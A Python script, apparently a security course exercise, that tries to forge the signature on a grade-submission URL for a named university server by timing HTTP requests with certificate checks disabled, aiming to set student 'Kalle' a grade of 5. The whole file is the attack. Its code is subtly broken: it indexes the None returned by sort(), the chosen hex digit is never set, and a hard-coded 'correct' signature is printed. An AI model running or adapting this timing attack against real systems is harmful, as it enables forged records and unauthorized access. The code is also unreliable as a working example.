import time
import ssl
import statistics
from urllib.request import urlopen


def getAmountOfTries(length):
    tries = 5
    if length > 3:
        tries = 12
    if length > 6:
        tries = 15
    if length > 8:
        tries = 25
    if length > 10:
        tries = 30
    if length > 14:
        tries = 35
    if length > 16:
        tries = 45
    if length > 18:
        tries = 60

    return tries


def moreIterations(elapsedVector):
    sortedVector = elapsedVector.sort()
    value0 = sortedVector[0]
    value1 = sortedVector[1]
    value2 = sortedVector[2]

    # Check if the difference is too small
    if value0/value1 < 0.90:
        return True
    return False


def buildSignature(url):
    signature = ""
    doAgain = True
    while (len(signature) < 20):
        elapsed_longest = 0.0
        bestHex = ""
        #tries = getAmountOfTries(len(signature))
        tries = 5 + 4 * len(signature)

        value_elapsed_min = []
        while doAgain:
            for testValue in range(0, 16):
                hexValueToAdd = hex(testValue)[2:]
                print("----------------------------")
                print("Trying to add:", hexValueToAdd)

                newUrl = url + signature + hexValueToAdd
                elapsedVector = []
                for t in range(0, tries):
                    start_time = time.time()
                    urlopen(newUrl, context=ssl._create_unverified_context())
                    fin_time = time.time()
                    elapsed_time = fin_time - start_time
                    elapsedVector.append(elapsed_time)
                elapsed_min = min(elapsedVector)
                value_elapsed_min.append(elapsed_min)
                # print("Total elapsed:", elapsed_min)
                # if elapsed_min > elapsed_longest:
                #elapsed_longest = elapsed_min
                #bestHex = hexValueToAdd

            doAgain = moreIterations(value_elapsed_min)
            signature += bestHex

        print("----------------------------")
        print("******************************")
        print("adding to signature:", bestHex)
        print("total signature:", signature)
        print("correct: 6823ea50b133c58cba36")  # TODO: REMOVE THIS
        print("******************************")
        print()
        print()

    return signature


def attack(name, grade):
    basic_url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?"
    target_url = "name="+name+"&grade="+str(grade)+"&signature="
    url = str(basic_url) + str(target_url)

    # Fint the signature which requires longest computational time on the URL
    signature = buildSignature(url)
    correct_url = url + signature
    return correct_url


totalt_time_start = time.time()
signature = attack("Kalle", 5)
totalt_time_fin = time.time()
print()
print("ANSWER")
print("---------------------------------------")
print("Signature:", signature)
print("Total time:", round((totalt_time_fin-totalt_time_start)/60, 2), " minutes")
